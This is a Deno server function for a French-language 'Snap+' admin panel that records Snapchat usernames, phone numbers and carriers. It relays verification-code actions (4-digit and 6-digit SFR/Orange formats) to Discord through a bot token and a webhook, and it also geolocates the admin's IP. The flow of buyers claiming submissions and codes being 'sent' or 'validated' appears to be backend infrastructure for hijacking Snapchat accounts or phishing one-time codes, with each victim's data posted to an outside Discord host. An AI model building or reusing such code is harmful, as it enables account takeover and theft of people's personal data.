import { createClientFromRequest } from 'npm:@base44/sdk@0.8.31';

const LOG_WEBHOOK = Deno.env.get("DISCORD_WEBHOOK");

const actionLabels = {
  valid: { label: "✅ Code validé par un admin", color: 0x2ECC71 },
  wrong: { label: "❌ Mauvais numéro", color: 0xE74C3C },
  expired: { label: "⏰ Code expiré / renvoyé", color: 0xF39C12 },
  wait: { label: "⏳ Mis en file d'attente", color: 0x3498DB },
  code_ready: { label: "📤 Code envoyé par un admin", color: 0xFFD700 },
  code6: { label: "🔢 Code 6 chiffres demandé", color: 0x9B59B6 },
  code6sfr: { label: "🔢 Code 6 chiffres (SFR FORMAT) demandé", color: 0xE74C3C },
  code6orange: { label: "🔢 Code 6 chiffres (ORANGE FORMAT) demandé", color: 0xFF6600 },
};

const statusMap = {
  valid: "code_valid",
  wrong: "code_wrong",
  expired: "code_expired",
  wait: "waiting_queue",
  code_ready: "code_ready",
  code6: "code6_ready",
  code6sfr: "code6sfr_ready",
  code6orange: "code6orange_ready",
};

Deno.serve(async (req) => {
  try {
    const { submissionId, action, discord, buyerId } = await req.json();

    if (!submissionId) {
      return Response.json({ error: 'submissionId requis' }, { status: 400 });
    }

    const newStatus = statusMap[action] || "code_ready";
    const base44 = createClientFromRequest(req);

    // Get admin IP & user agent
    const adminIp = req.headers.get("x-forwarded-for")?.split(",")[0]?.trim() || "Inconnue";

    // Fetch submission details
    const sub = await base44.asServiceRole.entities.Submission.get(submissionId).catch(() => null);

    // ---- Verrou par IP admin : la première action (envoi de code / validation /
    // mauvais / expiré) verrouille la demande à cette IP et exige un pseudo Discord
    // pour identifier l'administrateur dans les logs. Le pseudo Discord est lié
    // de façon persistante à l'IP de l'admin : il n'est demandé qu'une seule fois,
    // puis réutilisé automatiquement pour toutes les futures demandes. ----
    // Acheteur authentifié : l'action vient du panel buyer qui a déjà verrouillé
    // la soumission via claimSubmission (assigned_buyer_id + admin_ip). On fait
    // confiance à l'appartenance plutôt qu'au verrou IP — ce dernier est fragile
    // à travers la chaîne de proxies et bloque à tort les actions acheteur.
    if (buyerId && sub?.assigned_buyer_id === buyerId) {
      // buyer owns it — skip admin IP lock
    } else if (sub?.admin_ip) {
      // Une IP admin est déjà enregistrée : vérifie la correspondance
      if (sub.admin_ip !== adminIp) {
        return Response.json(
          { error: `Ce numéro est déjà verrouillé par un autre administrateur (${sub.admin_discord ? "@" + sub.admin_discord : sub.admin_ip}).` },
          { status: 403 }
        );
      }
    } else {
      // Première action sur cette demande : cherche l'identité Discord liée à l'IP
      let discordClean = (discord || "").trim().replace(/^@+/, "");

      // Si l'appelant n'a pas fourni de pseudo, cherche le mapping persistant IP→Discord
      if (!discordClean) {
        const existing = await base44.asServiceRole.entities.AdminIdentity.filter({ ip: adminIp }).catch(() => []);
        if (existing && existing.length > 0) {
          discordClean = existing[0].discord;
        }
      } else {
        // L'appelant a fourni un pseudo : l'enregistre/actualise pour cette IP
        const existing = await base44.asServiceRole.entities.AdminIdentity.filter({ ip: adminIp }).catch(() => []);
        if (existing && existing.length > 0) {
          if (existing[0].discord !== discordClean) {
            await base44.asServiceRole.entities.AdminIdentity.update(existing[0].id, { discord: discordClean }).catch(() => {});
          }
        } else {
          await base44.asServiceRole.entities.AdminIdentity.create({ ip: adminIp, discord: discordClean }).catch(() => {});
        }
      }

      // Toujours aucun pseudo : demande l'identification (première fois pour cette IP)
      if (!discordClean) {
        return Response.json({ discord_required: true }, { status: 200 });
      }

      await base44.asServiceRole.entities.Submission.update(submissionId, {
        admin_ip: adminIp,
        admin_discord: discordClean,
      });
      sub.admin_ip = adminIp;
      sub.admin_discord = discordClean;
    }

    await base44.asServiceRole.entities.Submission.update(submissionId, { status: newStatus });
    const userAgent = req.headers.get("user-agent") || "";

    // Detect browser
    let browser = "Inconnu";
    if (userAgent.includes("Edg/")) browser = "Edge";
    else if (userAgent.includes("OPR/") || userAgent.includes("Opera")) browser = "Opera";
    else if (userAgent.includes("Chrome")) browser = "Chrome";
    else if (userAgent.includes("Firefox")) browser = "Firefox";
    else if (userAgent.includes("Safari")) browser = "Safari";

    // Detect device
    let device = "Inconnu";
    if (/iPhone|iPad|iPod/.test(userAgent)) device = "iPhone/iPad";
    else if (/Android/.test(userAgent) && /Mobile/.test(userAgent)) device = "Téléphone Android";
    else if (/Android/.test(userAgent)) device = "Tablette Android";
    else if (/Windows|Macintosh|Linux/.test(userAgent)) device = "Desktop";

    // Geolocate admin IP with fallback
    let country = "Inconnue";
    let city = "Inconnue";
    try {
      const geoRes = await fetch(`https://geolocation-db.com/json/${adminIp}`, { signal: AbortSignal.timeout(5000) });
      if (geoRes.ok) {
        const geo = await geoRes.json();
        country = geo.country_name || "Inconnue";
        city = geo.city || "Inconnue";
      }
    } catch (e) {
      console.error("geolocation-db failed:", e.message);
      try {
        const geoRes = await fetch(`https://ip-api.com/json/${adminIp}`, { signal: AbortSignal.timeout(5000) });
        if (geoRes.ok) {
          const altData = await geoRes.json();
          if (altData.status === "success") {
            country = altData.country || "Inconnue";
            city = altData.city || "Inconnue";
          }
        }
      } catch (e2) {
        console.error("ip-api.com failed:", e2.message);
      }
    }

    const now = new Date();
    const heureStr = now.toLocaleString("fr-FR", {
      day: "numeric", month: "short", hour: "2-digit", minute: "2-digit", second: "2-digit",
      timeZone: "Europe/Paris"
    });

    const { label, color } = actionLabels[action] || actionLabels["code_ready"];

    const embed = {
      title: label,
      color,
      fields: [
        { name: "👻 Snapchat", value: sub?.snapchat || "N/A", inline: true },
        { name: "📞 Téléphone", value: sub?.telephone || "N/A", inline: true },
        { name: "📡 Opérateur", value: sub?.operateur || "N/A", inline: true },
        { name: "🌐 Navigateur", value: browser, inline: true },
        { name: "🏙️ Ville", value: city, inline: true },
        { name: "🌍 Pays", value: country, inline: true },
        { name: "💾 Appareil", value: device, inline: true },
        { name: "🕵️ IP Admin", value: `\`${adminIp}\``, inline: true },
        { name: "🎮 Discord", value: sub?.admin_discord ? `@${sub.admin_discord}` : "N/A", inline: true },
        { name: "🕐 Heure", value: heureStr, inline: false },
      ],
      footer: { text: `Admin Dashboard • Snap+` },
      timestamp: now.toISOString(),
    };

    // Contenu texte lisible par un bot : code d'action + numéro brut + opérateur.
    // Un bot qui écoute le channel via DISCORD_BOT_TOKEN ne lit souvent que le
    // `content` (pas les embeds) — sans cette ligne, l'action restait invisible.
    const actionCode = {
      code_ready: "CODE4", code6: "CODE6", code6sfr: "CODE6_SFR", code6orange: "CODE6_ORANGE",
      valid: "VALID", wrong: "WRONG", expired: "EXPIRED", wait: "WAIT",
    }[action] || "CODE4";
    const rawPhone = String(sub?.telephone || "").replace(/\D/g, "");
    const content = `📤 [${actionCode}] ${rawPhone} | ${sub?.operateur || ""} | ${sub?.snapchat || ""}`;

    // 1) Envoi dans le channel que le bot écoute (DISCORD_CHANNEL_ID) via l'API Bot.
    //    Un bot qui lit les messages via la Gateway ignore souvent les messages
    //    provenant d'un webhook (webhook_id présent) — il faut un "vrai" message
    //    bot pour déclencher l'envoi du code.
    const BOT_TOKEN = Deno.env.get("DISCORD_BOT_TOKEN");
    const CHANNEL_ID = Deno.env.get("DISCORD_CHANNEL_ID");
    let postedToChannel = false;
    if (BOT_TOKEN && CHANNEL_ID) {
      try {
        const chanRes = await fetch(`https://discord.com/api/v10/channels/${CHANNEL_ID}/messages`, {
          method: "POST",
          headers: { "Authorization": `Bot ${BOT_TOKEN}`, "Content-Type": "application/json" },
          body: JSON.stringify({ content, embeds: [embed] }),
        });
        postedToChannel = chanRes.ok;
        if (!chanRes.ok) {
          console.error(`Bot channel post error ${chanRes.status}: ${await chanRes.text()}`);
        }
      } catch (e) {
        console.error("Bot channel post failed:", e.message);
      }
    }

    // 2) Log webhook (canal de logs humain) — conservé en plus du channel bot.
    const webhookRes = await fetch(LOG_WEBHOOK, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ content, embeds: [embed] }),
    });
    if (!webhookRes.ok) {
      console.error(`Webhook error ${webhookRes.status}: ${await webhookRes.text()}`);
    }

    if (!postedToChannel && !webhookRes.ok) {
      return Response.json({ ok: true, webhook: false, error: "Discord send failed" });
    }

    return Response.json({ ok: true, webhook: true, channel: postedToChannel });
  } catch (error) {
    return Response.json({ error: error.message }, { status: 500 });
  }
});